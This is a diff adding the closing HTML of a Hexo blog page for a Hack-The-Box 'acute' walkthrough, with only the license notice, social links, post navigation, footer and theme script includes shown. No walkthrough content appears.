+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2022/02/16/acute/" title="Hack-The-Box-walkthrough[acute]">https://fdlucifer.github.io/2022/02/16/acute/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/14/stacked/" rel="prev" title="Hack-The-Box-walkthrough[stacked]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[stacked]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/02/24/undetected/" rel="next" title="Hack-The-Box-walkthrough[undetected]">
+                  Hack-The-Box-walkthrough[undetected] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
